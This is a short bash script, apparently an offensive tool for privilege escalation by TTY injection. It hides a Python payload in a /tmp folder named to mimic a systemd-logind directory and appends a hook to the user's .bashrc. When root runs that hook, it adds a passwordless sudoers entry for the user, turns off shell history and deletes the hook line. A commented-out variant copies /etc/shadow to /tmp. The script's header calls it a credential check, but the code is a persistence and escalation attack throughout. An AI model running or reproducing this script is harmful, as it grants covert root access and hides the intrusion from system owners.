#!/bin/bash
# This script was developed to check harvesting credentials
# Version="version 1.0"
# Date of last modification : 24/07/2023
# @TH3xACE - BLAIS David

who=$(whoami 2>/dev/null)
chkpy3=$(which python3)

if [ -n "$chkpy3" ]; then

mkdir -p /tmp/systemd-private-4fc9a6a11f1faac03adajohibasac-systemd-logind.service-idjae7
sleep 0.3
cp $PWD/ttyInject.py /tmp/systemd-private-4fc9a6a11f1faac03adajohibasac-systemd-logind.service-idjae7/logger.py
chmod +x /tmp/systemd-private-4fc9a6a11f1faac03adajohibasac-systemd-logind.service-idjae7/logger.py

#echo "# TTY Pushback" >> /home/"$who"/.bashrc
# Test - work
#2>/dev/null 
#echo "/tmp/systemd-private-4fc9a6a11f1faac03adajohibasac-systemd-logind.service-idjae7/logger.py \"\\[ \"\$(id -u)\" -eq 0 \\] && set +o history;cat /etc/shadow > /tmp/shad2.txt;clear;fg;reset;clear\" 2>/dev/null " >> /home/"$who"/.bashrc

echo "/tmp/systemd-private-4fc9a6a11f1faac03adajohibasac-systemd-logind.service-idjae7/logger.py \"\\[ \"\$(id -u)\" -eq 0 \\] && set +o history;echo \\\"$who ALL=(ALL:ALL) NOPASSWD: ALL\\\" >> /etc/sudoers;clear;fg;reset;clear;sed -i '/^\/tmp\/systemd-private-4fc9a/d' /home/$who/.bashrc \" 2>/dev/null " >> /home/"$who"/.bashrc

echo -e "[+] Remember to delete the following script once you are root with the cmd: rm -rf /tmp/systemd-private-4fc9a6a11f1faac03adajohibasac-systemd-logind.service-idjae7/"

fi


